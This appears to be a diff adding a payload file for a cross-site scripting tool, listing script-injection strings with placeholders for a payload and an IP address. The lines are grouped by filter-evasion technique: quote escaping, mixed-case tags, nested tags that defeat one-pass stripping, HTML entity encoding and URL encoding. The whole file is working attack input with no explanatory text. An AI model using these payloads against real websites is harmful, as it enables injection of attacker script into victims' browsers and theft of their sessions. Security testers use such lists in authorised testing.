@@ -1,0 +1,54 @@
+##Normal payloads with some variation
+<script>document.write('<script type=#payload>#ip</script>');</script>
+document.write('<script type=#payload>#ip</script>');</script>
+\<script\>document.write('<script type=#payload>#ip</script>');\<\/script\>
+<script >document.write('<script type=#payload>#ip</script>');< /script>
+
+##Escaping Strings
+"><script>document.write('<script type=#payload>#ip</script>');</script>
+\"\>\<script\>document.write('<script type=#payload>#ip</script>');\<\/script\>
+" ><script >document.write('<script type=#payload>#ip</script>');< /script>
+
+##Odd Capitalization
+<sCrIpT>document.write('<script type=#payload>#ip</script>');</ScRiPt>
+<sCrIpT>document.write('<script type=#payload>#ip</script>');</sCrIpT>
+
+
+##Recursion vulnerabilities
+<scr<script>ipt>document.write('<script type=#payload>#ip</script>');</script>
+<scr<script>ipt>document.write('<script type=#payload>#ip</script>');</scr</script>ipt>
+
+##HTML entity encoding
+&lt;script&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
+document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
+\&lt;script\&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');\&lt;\/script\&gt;
+&lt;script &gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt; /script&gt;
+
+&quot;&gt;&lt;script&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
+\&quot;\&gt;\&lt;script\&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');\&lt;\/script\&gt;
+&quot; &gt;&lt;script &gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt; /script&gt;
+
+&lt;sCrIpT&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/ScRiPt&gt;
+&lt;sCrIpT&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/sCrIpT&gt;
+
+
+&lt;scr&lt;script&gt;ipt&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/script&gt;
+&lt;scr&lt;script&gt;ipt&gt;document.write('&lt;script type=#payload&gt;#ip&lt;/script&gt;');&lt;/scr&lt;/script&gt;ipt&gt;
+
+
+##Character code/URL encoding
+%3Cscript%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%2Fscript%3E
+document.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%2Fscript%3E
+%5C%3Cscript%5C%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%5C%3C%5C%2Fscript%5C%3E
+%3Cscript%20%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%20%2Fscript%3E
+
+%22%3E%3Cscript%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%2Fscript%3E
+%5C%22%5C%3E%5C%3Cscript%5C%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%5C%3C%5C%2Fscript%5C%3E
+%22%20%3E%3Cscript%20%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%20%2Fscript%3E
+
+%3CsCrIpT%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%2FScRiPt%3E
+%3CsCrIpT%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%2FsCrIpT%3E
+
+
+%3Cscr%3Cscript%3Eipt%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%2Fscript%3E
+%3Cscr%3Cscript%3Eipt%3Edocument.write%28%27%3Cscript%20type%3D%23payload%3E%23ip%3C%2Fscript%3E%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E
